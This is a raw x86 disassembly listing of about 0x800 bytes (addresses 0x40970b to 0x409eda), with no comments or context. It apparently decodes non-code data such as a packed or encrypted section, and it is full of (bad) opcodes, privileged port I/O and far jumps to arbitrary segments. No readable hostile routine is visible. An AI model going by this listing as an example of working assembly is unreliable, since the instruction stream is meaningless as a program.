  40970b:	fiadd  DWORD PTR ds:0xd77c5f6
  409711:	cwde   
  409712:	hlt    
  409713:	mov    gs,WORD PTR [ebp-0x4d4d29ad]
  409719:	retf   0x5fb2
  40971c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40971d:	jo     0x4096f3
  40971f:	ins    DWORD PTR es:[edi],dx
  409720:	mov    bh,0xf1
  409722:	fmul   DWORD PTR [ebx-0x60924e3a]
  409728:	mov    al,0x2a
  40972a:	inc    ebp
  40972b:	dec    ebx
  40972c:	cmc    
  40972d:	sti    
  40972e:	inc    esp
  40972f:	cmp    eax,0xe26b436f
  409734:	sbb    BYTE PTR ds:0x8cfc9573,dh
  40973a:	pop    ebp
  40973b:	xlat   BYTE PTR ds:[ebx]
  40973c:	cmp    edi,DWORD PTR [ebp+esi*1-0x1e]
  409740:	mov    DWORD PTR [edx+0x79],edx
  409743:	loopne 0x4096d0
  409745:	inc    eax
  409746:	pop    ecx
  409747:	xchg   esi,eax
  409748:	jmp    0x756:0x1a3b508b
  40974f:	dec    eax
  409750:	jne    0x409771
  409752:	test   al,0xc7
  409754:	xor    BYTE PTR [eax+eiz*2-0x629ae1ff],dh
  40975b:	stc    
  40975c:	iret   
  40975d:	and    eax,0xd215137c
  409762:	outs   dx,BYTE PTR ds:[esi]
  409763:	pop    ebp
  409764:	inc    ebp
  409765:	rol    DWORD PTR [ecx-0x3b357075],0xb5
  40976c:	mov    ecx,0x14cca6e1
  409771:	sbb    DWORD PTR [ebp+edx*1+0x3b],0x8b223cd7
  409779:	pusha  
  40977a:	sbb    ecx,edx
  40977c:	shl    DWORD PTR [eax+0x52],cl
  40977f:	retf   
  409780:	dec    esi
  409781:	loope  0x409740
  409783:	shl    ebx,cl
  409785:	mov    ds:0xe263ce81,al
  40978a:	call   0x7ff8:0x3bedf4d9
  409791:	lods   eax,DWORD PTR es:[esi]
  409793:	mov    edx,0xfa6998ca
  409798:	mov    DWORD PTR [ecx+0x5877da84],0xca56f02b
  4097a2:	imul   ebx,DWORD PTR [ebp-0x1a7c5562],0x15abfe92
  4097ac:	xlat   BYTE PTR ds:[ebx]
  4097ad:	shl    BYTE PTR [edi+0xdecc6ef],1
  4097b3:	lea    esp,[edi+ebp*2-0x2d]
  4097b7:	inc    esp
  4097b8:	mov    ecx,0x7d41afbd
  4097bd:	add    DWORD PTR [ebx],esp
  4097bf:	enter  0xbdf5,0xf3
  4097c3:	push   esp
  4097c4:	and    bh,bl
  4097c6:	cld    
  4097c7:	out    dx,al
  4097c8:	add    ebp,eax
  4097ca:	push   edx
  4097cb:	and    ch,BYTE PTR ds:0x4ba51279
  4097d1:	(bad)  [ebx-0x18]
  4097d4:	dec    edi
  4097d5:	adc    ch,BYTE PTR ds:0x3706ac97
  4097db:	pop    edi
  4097dc:	inc    eax
  4097dd:	in     al,0xe
  4097df:	std    
  4097e0:	imul   ebx,DWORD PTR [ebp+0x1d],0xffffffd9
  4097e4:	dec    BYTE PTR [edi+0x58efff3e]
  4097ea:	push   ebp
  4097eb:	mov    esp,DWORD PTR [edi+edx*4+0x19b74f65]
  4097f2:	dec    ecx
  4097f3:	and    BYTE PTR [eax-0x6b],bl
  4097f6:	lahf   
  4097f7:	das    
  4097f8:	js     0x4097bb
  4097fa:	sub    edx,DWORD PTR [ebx-0x4bab6ef0]
  409800:	push   edi
  409801:	rcl    BYTE PTR [ebp-0x15],cl
  409804:	fldcw  WORD PTR [esi-0x653ef2f8]
  40980a:	jae    0x4097f4
  40980c:	sub    eax,0x81742354
  409811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409812:	scas   eax,DWORD PTR es:[edi]
  409813:	jb     0x409857
  409815:	push   0x668e1282
  40981a:	xor    eax,0x85356067
  40981f:	pop    edi
  409820:	ins    BYTE PTR es:[edi],dx
  409821:	outs   dx,DWORD PTR ds:[esi]
  409822:	ja     0x409859
  409824:	div    DWORD PTR [esi]
  409826:	(bad)  
  409828:	popa   
  409829:	sbb    ch,ah
  40982b:	out    dx,al
  40982c:	out    dx,eax
  40982d:	mov    esi,0xe10bcbd7
  409832:	and    ah,bh
  409834:	aas    
  409835:	in     al,0x21
  409837:	(bad)  
  409839:	test   BYTE PTR [esi+0xee788e3],ah
  40983f:	mov    edi,0x387955f6
  409844:	cmp    edi,edi
  409846:	pop    ebp
  409847:	pop    ecx
  409848:	clc    
  409849:	aad    0xd
  40984b:	call   0xa803cc13
  409850:	add    BYTE PTR [ecx-0x5],bl
  409853:	add    ebx,esp
  409855:	loop   0x4098a6
  409857:	mov    dl,0xce
  409859:	test   eax,0xc1bb1a91
  40985e:	push   ds
  40985f:	add    ah,BYTE PTR [edx+0x6f]
  409862:	push   fs
  409864:	jno    0x40982a
  409866:	mov    ecx,0x6c4f438f
  40986b:	mov    bh,0x3c
  40986d:	mov    ah,0x9e
  40986f:	repnz cmp eax,0xca1d9845
  409875:	cmp    eax,0xc8ac8af9
  40987a:	or     al,0xce
  40987c:	ret    
  40987d:	fisubr WORD PTR [ebp+0x7f65a5e3]
  409883:	xchg   ecx,eax
  409884:	push   ebx
  409885:	jae    0x4098ad
  409887:	mov    DWORD PTR [eax],edx
  409889:	imul   ebx,DWORD PTR [ebp+edi*4+0x1d7e3f9e],0x37
  409891:	sub    al,0x1a
  409893:	in     al,0x6e
  409895:	jle    0x40983b
  409897:	adc    al,0xd
  409899:	xchg   esp,eax
  40989a:	outs   dx,BYTE PTR ds:[esi]
  40989b:	or     edx,DWORD PTR [ecx+0x62556994]
  4098a1:	lock cs xchg ebp,eax
  4098a4:	mov    ds:0x37435956,eax
  4098a9:	pop    ds
  4098aa:	add    bl,BYTE PTR [edx]
  4098ac:	sbb    ecx,esp
  4098ae:	call   0x3f57:0x21129c8
  4098b5:	adc    al,0xce
  4098b7:	fisttp WORD PTR [edi]
  4098b9:	jne    0x40986f
  4098bb:	jnp    0x409892
  4098bd:	je     0x409878
  4098bf:	shl    DWORD PTR [ecx],cl
  4098c1:	aad    0xdd
  4098c3:	dec    esi
  4098c4:	xor    ah,bh
  4098c6:	mov    al,ds:0xf44c00e
  4098cb:	loope  0x409904
  4098cd:	stos   DWORD PTR es:[edi],eax
  4098ce:	mov    ah,0xe9
  4098d0:	xlat   BYTE PTR ds:[ebx]
  4098d1:	jmp    0x8d74:0x945bdf94
  4098d8:	fdivr  QWORD PTR [eax]
  4098da:	repz sbb dl,bl
  4098dd:	gs mov dh,0xd5
  4098e0:	ror    cl,0x1
  4098e3:	imul   ecx,edx,0x489ae08d
  4098e9:	or     DWORD PTR [ebp-0x7955b52d],edi
  4098ef:	xor    BYTE PTR [ebp-0x47],0xbc
  4098f3:	add    al,0xbe
  4098f5:	cdq    
  4098f6:	add    ebp,0xffffffdb
  4098f9:	pop    ds
  4098fa:	jle    0x409885
  4098fc:	push   ebx
  4098fd:	push   ss
  4098fe:	mov    DWORD PTR [edx],ecx
  409900:	fisttp QWORD PTR [ebx+0x58]
  409903:	repnz mov cl,0xc2
  409906:	les    ecx,FWORD PTR [ebp+0x6f]
  409909:	loopne 0x4098e6
  40990b:	je     0x409915
  40990d:	add    DWORD PTR [edi+0x50b46f52],esp
  409913:	mov    eax,0x804f3aef
  409918:	add    eax,0x482b0bc0
  40991d:	or     ecx,ebp
  40991f:	xchg   ecx,eax
  409920:	xchg   edi,eax
  409921:	or     al,BYTE PTR [ebx-0x7e]
  409924:	fxtract 
  409926:	add    BYTE PTR [esi],bh
  409928:	push   0x70793c56
  40992d:	and    DWORD PTR [ecx+0x45bca457],ebx
  409933:	pop    ss
  409934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409935:	scas   al,BYTE PTR es:[edi]
  409936:	sub    DWORD PTR [ecx+0x20],0x7d1909af
  40993d:	and    DWORD PTR [ebp-0x3702346],ecx
  409943:	imul   ebx,DWORD PTR [edx+0x66],0x6b
  409947:	(bad)  
  409949:	and    DWORD PTR [edx+eiz*1-0x5d],edx
  40994d:	(bad)  
  40994f:	std    
  409950:	jge    0x4099a5
  409952:	push   0x867363b5
  409957:	cdq    
  409958:	int3   
  409959:	xor    eax,0x7786ce9c
  40995e:	dec    ebx
  40995f:	sbb    BYTE PTR [edx-0x24848902],0x26
  409966:	mov    WORD PTR [esi+0x36],?
  409969:	fstp   DWORD PTR [edi+0x11125233]
  40996f:	stos   DWORD PTR es:[edi],eax
  409970:	retf   
  409971:	sub    al,0xa7
  409973:	mov    esp,DWORD PTR [edi]
  409975:	mov    al,fs:0x9155ab1a
  40997b:	std    
  40997c:	inc    esi
  40997d:	sub    dh,0x64
  409980:	fmul   DWORD PTR [ebp+0x2b]
  409983:	pop    esi
  409984:	xor    al,0x50
  409986:	dec    edx
  409987:	cmp    al,0x85
  409989:	jmp    0xf6cc:0xfbcc2dff
  409990:	cmp    eax,DWORD PTR [edi+ebp*2-0x5741b254]
  409997:	mul    esi
  409999:	mov    bl,0xf7
  40999b:	add    edi,DWORD PTR [esi+0x58]
  40999e:	jns    0x40997c
  4099a0:	(bad)  
  4099a1:	and    bl,ch
  4099a3:	push   ss
  4099a4:	push   es
  4099a5:	test   DWORD PTR [eax+0xbe7d59b],ecx
  4099ab:	imul   eax,ebx,0xffffffb9
  4099ae:	push   esp
  4099af:	mov    ebp,0xb6acf44c
  4099b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b5:	das    
  4099b6:	pop    edx
  4099b7:	mov    dh,0xc3
  4099b9:	fmul   QWORD PTR [esi+0x42e04b9a]
  4099bf:	dec    ebx
  4099c0:	mov    BYTE PTR [edx],cl
  4099c2:	(bad)  
  4099c3:	nop
  4099c4:	xor    al,0x75
  4099c6:	add    ebp,ebx
  4099c8:	test   DWORD PTR [eax],esi
  4099ca:	out    0x57,eax
  4099cc:	adc    eax,ecx
  4099ce:	(bad)  
  4099cf:	jmp    0x4099cc
  4099d1:	xor    BYTE PTR [ecx+0x18b7db96],ah
  4099d7:	lods   al,BYTE PTR ds:[esi]
  4099d8:	(bad)
  4099db:	std    
  4099dc:	repz imul ebp,DWORD PTR [eax],0x9f6cf7b7
  4099e3:	xlat   BYTE PTR ds:[ebx]
  4099e4:	inc    eax
  4099e5:	out    dx,al
  4099e6:	sbb    BYTE PTR [edx-0x6d17e3b3],cl
  4099ec:	in     eax,0x10
  4099ee:	push   ebp
  4099ef:	cmp    eax,0x55663c54
  4099f4:	and    al,0x9
  4099f6:	data16 jns 0x4099d2
  4099f9:	mov    cl,0x42
  4099fb:	hlt    
  4099fc:	mov    ecx,0x7f0f9c
  409a01:	fidivr DWORD PTR [ebp-0x53955101]
  409a07:	sbb    BYTE PTR [eax],ah
  409a09:	push   esi
  409a0a:	out    dx,al
  409a0b:	iret   
  409a0c:	out    dx,al
  409a0d:	int3   
  409a0e:	cld    
  409a0f:	xchg   edi,eax
  409a10:	pop    ebx
  409a11:	adc    ebx,DWORD PTR [ebx]
  409a13:	fiadd  WORD PTR [ebx+eiz*2+0x68326a05]
  409a1a:	pop    ebp
  409a1b:	mov    eax,0xab3280c8
  409a20:	sub    dl,ch
  409a22:	retf   
  409a23:	or     cl,BYTE PTR [ecx+0xef1dda2]
  409a29:	jmp    FWORD PTR [edi-0x4be07749]
  409a2f:	dec    eax
  409a30:	ss push ds
  409a32:	jbe    0x409a6d
  409a34:	mov    al,0xdb
  409a36:	sub    ebx,DWORD PTR [ebx-0x12612b63]
  409a3c:	inc    esi
  409a3d:	add    ebx,DWORD PTR [ebx-0x3]
  409a40:	aas    
  409a41:	fs dec ebx
  409a43:	push   ebp
  409a44:	cmc    
  409a45:	hlt    
  409a46:	inc    ebx
  409a47:	dec    ebx
  409a48:	test   DWORD PTR [edx+0x56d7cabc],0x794236e2
  409a52:	out    0x23,al
  409a54:	jecxz  0x409a6c
  409a56:	imul   ebx,edi,0x7
  409a59:	xchg   BYTE PTR [ebp+0x61],cl
  409a5c:	mov    dl,0xfc
  409a5e:	pop    ebx
  409a5f:	and    al,0x1b
  409a61:	fwait
  409a62:	into   
  409a63:	retf   
  409a64:	call   0xb0e4b0b7
  409a69:	in     al,0x5c
  409a6b:	pop    es
  409a6c:	out    0x82,al
  409a6e:	cdq    
  409a6f:	xor    edi,0xffffff9c
  409a72:	mov    cl,0x2e
  409a74:	in     eax,dx
  409a75:	iret   
  409a76:	push   es
  409a77:	arpl   WORD PTR [edx+0x30da6657],ax
  409a7d:	aad    0xee
  409a7f:	gs je  0x409a91
  409a82:	mov    dh,0x76
  409a84:	leave  
  409a85:	cs mov ebp,0x7de6718a
  409a8b:	inc    edx
  409a8c:	outs   dx,BYTE PTR ds:[esi]
  409a8d:	stos   DWORD PTR es:[edi],eax
  409a8e:	cld    
  409a8f:	hlt    
  409a90:	add    BYTE PTR [edi],0x66
  409a93:	mov    bl,0xca
  409a95:	call   DWORD PTR [eax-0xc]
  409a98:	das    
  409a99:	(bad)  
  409a9a:	pop    ebx
  409a9b:	xchg   ebx,eax
  409a9c:	shl    BYTE PTR [eax],1
  409a9e:	push   edx
  409a9f:	daa    
  409aa0:	ins    DWORD PTR es:[edi],dx
  409aa1:	mov    bl,0x5c
  409aa3:	fsub   QWORD PTR [ebx-0x73207e5d]
  409aa9:	fbld   TBYTE PTR [ebp-0x69]
  409aac:	dec    eax
  409aad:	repnz inc ebp
  409aaf:	xor    eax,ebx
  409ab1:	js     0x409a65
  409ab3:	jp     0x409aa5
  409ab5:	ins    DWORD PTR es:[edi],dx
  409ab6:	push   es
  409ab7:	xor    edx,DWORD PTR [esi+0x57]
  409aba:	dec    edx
  409abb:	jno    0x409ac8
  409abd:	jmp    0x746f:0xe79384bf
  409ac4:	jo     0x409b0b
  409ac6:	xchg   ah,ch
  409ac8:	scas   eax,DWORD PTR es:[edi]
  409ac9:	gs sub al,0x7d
  409acc:	fdivr  DWORD PTR [esi+0x559aa6fe]
  409ad2:	mov    es,WORD PTR [edi+0x25]
  409ad5:	pop    edi
  409ad6:	das    
  409ad7:	loope  0x409a6a
  409ad9:	pop    ebp
  409ada:	pop    esp
  409adb:	inc    edi
  409adc:	pop    edx
  409add:	add    al,BYTE PTR [esi+0x23b4f170]
  409ae3:	(bad)  
  409ae4:	fcmovne st,st(0)
  409ae6:	or     bh,BYTE PTR [esi]
  409ae8:	fnstcw WORD PTR [ecx+0x64722f08]
  409aee:	pop    ebx
  409aef:	and    BYTE PTR [edx-0x79],dl
  409af2:	lock in al,dx
  409af4:	xlat   BYTE PTR ds:[ebx]
  409af5:	arpl   WORD PTR [ebp-0x30ee96c2],bp
  409afb:	sbb    dh,bh
  409afd:	cwde   
  409afe:	lods   al,BYTE PTR ds:[esi]
  409aff:	enter  0x1d09,0xc
  409b03:	fild   QWORD PTR [ebp-0x2668c0dc]
  409b09:	in     eax,dx
  409b0a:	or     eax,0x8bd3fdf8
  409b0f:	cmp    ecx,0xf953a3cd
  409b15:	adc    DWORD PTR [edx+ecx*8],ebx
  409b18:	std    
  409b19:	mov    bl,0xe3
  409b1b:	loopne 0x409b1a
  409b1d:	std    
  409b1e:	push   eax
  409b1f:	push   ss
  409b20:	or     eax,0xa139d7ac
  409b25:	stos   BYTE PTR es:[edi],al
  409b26:	ret    
  409b27:	jnp    0x409b1a
  409b29:	icebp  
  409b2a:	mov    ds,edi
  409b2c:	or     DWORD PTR [ecx],edi
  409b2e:	push   ds
  409b2f:	mov    al,ds:0xfc92e5a5
  409b34:	xor    al,BYTE PTR [edx-0xc]
  409b37:	or     DWORD PTR [esi-0x512e1548],esi
  409b3d:	xchg   bl,dh
  409b3f:	gs in  eax,dx
  409b41:	mov    bh,0x7f
  409b43:	pop    ecx
  409b44:	jecxz  0x409b44
  409b46:	add    eax,0x8472923f
  409b4b:	sbb    esi,DWORD PTR [ebx-0x56]
  409b4e:	ins    DWORD PTR es:[edi],dx
  409b4f:	enter  0xc746,0x97
  409b53:	loopne 0x409b2c
  409b55:	adc    eax,eax
  409b57:	push   0x1007751c
  409b5c:	mov    ah,0x30
  409b5e:	out    dx,al
  409b5f:	sub    ch,0x11
  409b62:	mov    eax,0x2b51e99
  409b67:	test   eax,0x59b3647d
  409b6c:	push   esp
  409b6d:	pop    ss
  409b6e:	out    0xb3,al
  409b70:	ja     0x409bc2
  409b72:	jno    0x409b12
  409b74:	push   esi
  409b75:	push   esi
  409b76:	push   es
  409b77:	inc    ebx
  409b78:	mov    ds:0x1cb39887,eax
  409b7d:	dec    edx
  409b7e:	xchg   edx,eax
  409b7f:	xor    ch,BYTE PTR [ebx+0x7]
  409b82:	retf   
  409b83:	call   0xca51ca2d
  409b88:	shl    BYTE PTR es:[ecx+eax*8],1
  409b8c:	jmp    0xc83b:0xe43d25ac
  409b93:	mov    DWORD PTR [ebp+0x47],eax
  409b96:	push   edx
  409b97:	pop    edi
  409b98:	into   
  409b99:	cmp    eax,0x222ecce7
  409b9e:	das    
  409b9f:	jge    0x409b38
  409ba1:	mov    esp,0xcdebd2fa
  409ba6:	std    
  409ba7:	leave  
  409ba8:	mov    edx,0xf418ad23
  409bad:	push   es
  409bae:	aas    
  409baf:	mov    ebx,0x7402bc86
  409bb4:	mov    bl,0x9a
  409bb6:	cmp    BYTE PTR [ecx-0x5e],ah
  409bb9:	out    dx,eax
  409bba:	loopne 0x409b69
  409bbc:	sub    BYTE PTR [eax-0x3487423f],bl
  409bc2:	sub    eax,0xbaf20eaa
  409bc7:	jp     0x409c3a
  409bc9:	and    BYTE PTR [ebp-0x65506ec5],ah
  409bcf:	je     0x409be8
  409bd1:	int3   
  409bd2:	add    bh,BYTE PTR [esi-0x1a497399]
  409bd8:	pop    esi
  409bd9:	inc    ebx
  409bda:	ror    BYTE PTR [ecx-0x2e],cl
  409bdd:	mov    dl,0x31
  409bdf:	xchg   esp,eax
  409be0:	hlt    
  409be1:	imul   ecx,DWORD PTR [ebp-0x56a2007],0x35
  409be8:	fsub   QWORD PTR [ecx+0x7b]
  409beb:	mov    bl,0xcd
  409bed:	xlat   BYTE PTR ds:[ebx]
  409bee:	pushf  
  409bef:	cdq    
  409bf0:	cmp    eax,0xf220951d
  409bf5:	cld    
  409bf6:	in     al,0x1e
  409bf8:	push   ebp
  409bf9:	jp     0x409ba1
  409bfb:	push   ecx
  409bfc:	sub    ch,dh
  409bfe:	aad    0xd5
  409c00:	adc    al,ah
  409c02:	ds das 
  409c04:	and    al,0x8a
  409c06:	ins    BYTE PTR es:[edi],dx
  409c07:	or     al,BYTE PTR [esi+ebp*4]
  409c0a:	mov    ebx,?
  409c0c:	ja     0x409b8e
  409c0e:	loope  0x409bfa
  409c10:	ds jne 0x409c1c
  409c13:	xor    eax,0x43df19db
  409c18:	jmp    0x409c76
  409c1a:	bound  eax,QWORD PTR [ebx+0x3f7117bb]
  409c20:	add    bl,dl
  409c22:	push   0xa4986db9
  409c27:	and    dh,0x5
  409c2a:	xchg   esp,eax
  409c2b:	loopne 0x409ca6
  409c2d:	popf   
  409c2e:	pop    es
  409c2f:	jns    0x409bf5
  409c31:	adc    al,0x40
  409c33:	jl     0x409be2
  409c35:	inc    ecx
  409c36:	pop    ds
  409c37:	pop    edx
  409c38:	mov    bl,0x6b
  409c3a:	dec    edi
  409c3b:	ret    
  409c3c:	inc    eax
  409c3d:	xor    al,0xb2
  409c3f:	loope  0x409c22
  409c41:	and    DWORD PTR [edx-0x80],edi
  409c44:	inc    edi
  409c45:	fsub   QWORD PTR [ecx]
  409c47:	mov    bl,0x9d
  409c49:	mov    al,ds:0x60f03949
  409c4e:	lock push 0x1c
  409c51:	pop    esi
  409c52:	repnz in eax,0x4c
  409c55:	dec    ecx
  409c56:	stos   DWORD PTR es:[edi],eax
  409c57:	mov    ebx,0x5fdcc25e
  409c5c:	push   0xb
  409c5e:	jg     0x409c7e
  409c60:	mov    ebp,0x15a10380
  409c65:	dec    edi
  409c66:	jl     0x409c83
  409c68:	int3   
  409c69:	add    dh,cl
  409c6b:	and    DWORD PTR es:0xdd8123d5,ebx
  409c72:	outs   dx,BYTE PTR ds:[esi]
  409c73:	dec    eax
  409c74:	lahf   
  409c75:	jmp    0x4fe9d3e5
  409c7a:	sbb    eax,DWORD PTR [edx-0x57]
  409c7d:	jmp    0x46f7:0xb544d6f0
  409c84:	mov    DWORD PTR [edx+eax*1+0x63],esp
  409c88:	(bad)  
  409c8a:	xor    al,0xe3
  409c8c:	jno    0x409c2b
  409c8e:	and    DWORD PTR [esi+eax*4],ebp
  409c91:	sbb    eax,0x46a530de
  409c96:	and    ebx,esp
  409c98:	aas    
  409c99:	shl    ch,1
  409c9b:	fstp   QWORD PTR [ecx-0x694547f7]
  409ca1:	das    
  409ca2:	dec    eax
  409ca3:	fimul  WORD PTR [eax-0x6929b286]
  409ca9:	jnp    0x409cea
  409cab:	mov    cl,0xb7
  409cad:	jge    0x409c34
  409caf:	mov    bh,0x2b
  409cb1:	push   esi
  409cb2:	adc    eax,0x81a3c832
  409cb7:	mov    ecx,0x245caa66
  409cbc:	test   BYTE PTR [edx-0x6c35eee8],dl
  409cc2:	cwde   
  409cc3:	jg     0x409d38
  409cc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cc6:	jle    0x409cb9
  409cc8:	daa    
  409cc9:	mov    DWORD PTR [edi-0x77],0xa0b3fec6
  409cd0:	xor    edx,DWORD PTR [esi-0x5a]
  409cd3:	dec    ebp
  409cd4:	addr16 in eax,0xb3
  409cd7:	inc    ebx
  409cd8:	in     al,dx
  409cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cda:	(bad)  
  409cdc:	mov    eax,0x119bb622
  409ce1:	(bad)  
  409ce2:	out    dx,al
  409ce3:	mov    edx,0x97ebb335
  409ce8:	out    0x8d,al
  409cea:	ds jmp 0x2b21:0xbe0c2334
  409cf2:	sbb    al,0xea
  409cf4:	dec    edi
  409cf5:	repz and ch,BYTE PTR [ebx+ebx*2-0x14]
  409cfa:	or     cl,BYTE PTR [ecx+0x40]
  409cfd:	mov    al,0xb8
  409cff:	fsub   st(5),st
  409d01:	scas   eax,DWORD PTR es:[edi]
  409d02:	inc    edx
  409d03:	mov    ds:0x703a562c,al
  409d08:	xchg   ebp,eax
  409d09:	sub    eax,0xe1206630
  409d0e:	loop   0x409ccc
  409d10:	fwait
  409d11:	jp     0x409d3b
  409d13:	xlat   BYTE PTR ds:[ebx]
  409d14:	mov    ds:0x8b66a9cf,eax
  409d19:	dec    esi
  409d1a:	mov    ebp,0x2bf63128
  409d1f:	cmp    bl,cl
  409d21:	mov    al,ds:0xa183d5c1
  409d26:	leave  
  409d27:	cmp    eax,0xf349a396
  409d2c:	stos   DWORD PTR es:[edi],eax
  409d2d:	jmp    0xe8c38223
  409d32:	cli    
  409d33:	xor    DWORD PTR [ecx+0x12],esp
  409d36:	cwde   
  409d37:	push   ss
  409d38:	out    dx,al
  409d39:	mov    esi,0xa293ca7f
  409d3e:	stos   BYTE PTR es:[edi],al
  409d3f:	leave  
  409d40:	in     eax,dx
  409d41:	or     edi,DWORD PTR [edx+0x144ab93e]
  409d47:	push   esi
  409d48:	mov    dl,0x61
  409d4a:	and    dh,cl
  409d4c:	repnz sti 
  409d4e:	cmp    dl,al
  409d50:	ja     0x409d4f
  409d52:	jmp    0x409d9e
  409d54:	(bad)  
  409d55:	ins    BYTE PTR es:[edi],dx
  409d56:	fwait
  409d57:	xor    ecx,esi
  409d59:	pop    esp
  409d5a:	les    eax,FWORD PTR [ecx]
  409d5c:	fldcw  WORD PTR [esi+0x1ebe10f9]
  409d62:	lods   al,BYTE PTR ds:[esi]
  409d63:	cmp    eax,0x71864b4a
  409d68:	int    0xae
  409d6a:	sub    esi,edi
  409d6c:	dec    ecx
  409d6d:	clc    
  409d6e:	xor    dh,bh
  409d70:	fidivr DWORD PTR [ebp+0x7c84b3b6]
  409d76:	pop    ebx
  409d77:	das    
  409d78:	mov    cl,0xbe
  409d7a:	repnz lahf 
  409d7c:	add    eax,DWORD PTR [ebp-0x35]
  409d7f:	xchg   DWORD PTR [ecx+0x73],eax
  409d82:	push   ss
  409d83:	pop    ss
  409d84:	inc    edi
  409d85:	jns    0x409d6b
  409d87:	hlt    
  409d88:	dec    eax
  409d89:	dec    DWORD PTR [esi-0x28]
  409d8c:	adc    al,0x1
  409d8e:	dec    esi
  409d8f:	xor    eax,0x120a51e8
  409d94:	outs   dx,DWORD PTR ds:[esi]
  409d95:	pop    DWORD PTR [eax+ecx*8+0x6e2f6504]
  409d9c:	mov    ds:0x5e845954,eax
  409da1:	not    al
  409da3:	dec    eax
  409da4:	stos   BYTE PTR es:[edi],al
  409da5:	xchg   DWORD PTR [eax+0xd],edx
  409da8:	dec    edx
  409da9:	test   eax,0x44fea114
  409dae:	adc    al,0x69
  409db0:	lds    eax,FWORD PTR [ebp+0x32]
  409db3:	sbb    al,0xc5
  409db5:	or     ch,BYTE PTR [edx+edi*4]
  409db8:	stos   BYTE PTR es:[edi],al
  409db9:	lods   al,BYTE PTR ds:[esi]
  409dba:	add    eax,DWORD PTR [esi+0x1e]
  409dbd:	(bad)  [esi+edi*1]
  409dc0:	cdq    
  409dc1:	add    al,BYTE PTR [ecx+0x5239ef01]
  409dc7:	mov    dl,0x62
  409dc9:	shl    bh,0xf
  409dcc:	push   edi
  409dcd:	sbb    eax,0xa0b81267
  409dd2:	push   esp
  409dd3:	or     DWORD PTR [ebp+0x6b],ecx
  409dd6:	das    
  409dd7:	mov    ch,0xea
  409dd9:	retf   
  409dda:	or     DWORD PTR [eax],esi
  409ddc:	adc    DWORD PTR [ebx-0x3],esi
  409ddf:	pop    ecx
  409de0:	(bad)  
  409de1:	mov    WORD PTR [ecx],gs
  409de3:	les    esp,FWORD PTR ds:0x6f510f19
  409de9:	push   esi
  409dea:	mov    edi,0x3d38dfd1
  409def:	fist   WORD PTR [eax]
  409df1:	sti    
  409df2:	pop    edi
  409df3:	or     DWORD PTR [ecx+ecx*2+0x624b0ca7],ebx
  409dfa:	adc    BYTE PTR [esi+ebp*4-0x32114482],dl
  409e01:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409e03:	mov    ah,0xa6
  409e05:	cmc    
  409e06:	pop    edi
  409e07:	fmul   DWORD PTR [edx+0x5c]
  409e0a:	out    dx,al
  409e0b:	pop    esp
  409e0c:	lea    ecx,[edi+0x40]
  409e0f:	gs lahf 
  409e11:	jns    0x409e7c
  409e13:	and    BYTE PTR [ebp-0x25],dh
  409e16:	fdiv   st,st(3)
  409e18:	pop    esi
  409e19:	push   cs
  409e1a:	daa    
  409e1b:	lea    edi,[ecx]
  409e1d:	sub    DWORD PTR ds:0xa341036e,ebp
  409e23:	jp     0x409db0
  409e25:	add    esi,DWORD PTR [ebx+eiz*2]
  409e28:	push   ebx
  409e29:	repnz pop ebp
  409e2b:	(bad)  
  409e2c:	and    edx,DWORD PTR [esi+ebx*4+0x382ee307]
  409e33:	lahf   
  409e34:	pop    ecx
  409e35:	add    DWORD PTR [edx],edx
  409e37:	jns    0x409e21
  409e39:	call   0x80223094
  409e3e:	ja     0x409dc1
  409e40:	mov    WORD PTR [ebx],fs
  409e42:	dec    ecx
  409e43:	push   esp
  409e44:	cwde   
  409e45:	ret    
  409e46:	ins    BYTE PTR es:[edi],dx
  409e47:	fwait
  409e48:	xchg   edx,eax
  409e49:	cmp    DWORD PTR [esi],esp
  409e4b:	sbb    DWORD PTR [edi],ebx
  409e4d:	xor    BYTE PTR [esi+0x4061b7ca],bh
  409e53:	xchg   edi,eax
  409e54:	push   ebx
  409e55:	push   esi
  409e56:	push   0x7f
  409e58:	out    dx,eax
  409e59:	(bad)  
  409e5a:	stos   BYTE PTR es:[edi],al
  409e5b:	or     al,al
  409e5d:	loope  0x409ea9
  409e5f:	retf   
  409e60:	jne    0x409eb6
  409e62:	(bad)
  409e65:	gs adc al,0xbf
  409e68:	cdq    
  409e69:	outs   dx,BYTE PTR ds:[esi]
  409e6a:	shr    DWORD PTR [esi-0x19d50676],1
  409e70:	ja     0x409ebc
  409e72:	mov    eax,0x52b91f64
  409e77:	and    esi,ecx
  409e79:	xor    DWORD PTR [edx],edi
  409e7b:	idiv   BYTE PTR [eax+0x603b17d4]
  409e81:	push   ds
  409e82:	clc    
  409e83:	ja     0x409eb6
  409e85:	mov    eax,ds:0xe15899e7
  409e8a:	inc    ebx
  409e8b:	repz xchg edi,eax
  409e8d:	push   ss
  409e8e:	sbb    esp,DWORD PTR [ebx+ebp*8]
  409e91:	mov    esi,0x36db8d80
  409e96:	in     eax,dx
  409e97:	jo     0x409eab
  409e99:	loope  0x409e5c
  409e9b:	(bad)  
  409e9d:	shl    BYTE PTR [edi+ebp*4],1
  409ea0:	dec    ecx
  409ea1:	xor    al,0x77
  409ea3:	sub    al,0x45
  409ea5:	xchg   ebp,eax
  409ea6:	in     al,dx
  409ea7:	pop    edi
  409ea8:	mov    cl,0x60
  409eaa:	jb     0x409ec1
  409eac:	loopne 0x409eb6
  409eae:	xchg   BYTE PTR [ecx-0x26852940],dl
  409eb4:	sbb    DWORD PTR [edx],0xfffffff4
  409eb7:	pop    ecx
  409eb8:	and    ebp,ebx
  409eba:	(bad)  
  409ebb:	cmc    
  409ebc:	mov    al,ds:0x52062ff7
  409ec1:	mov    dl,bh
  409ec3:	mov    ebx,ecx
  409ec5:	push   ecx
  409ec6:	test   al,0xbb
  409ec8:	popf   
  409ec9:	repnz push edx
  409ecb:	xchg   ebp,eax
  409ecc:	test   DWORD PTR [ebp+0x14c35403],esp
  409ed2:	gs push ecx
  409ed4:	stos   BYTE PTR es:[edi],al
  409ed5:	movntq (bad),mm1
  409ed6:	out    0xcb,eax
  409ed8:	cld    
  409ed9:	stos   DWORD PTR es:[edi],eax
  409eda:	ins    BYTE PTR es:[edi],dx
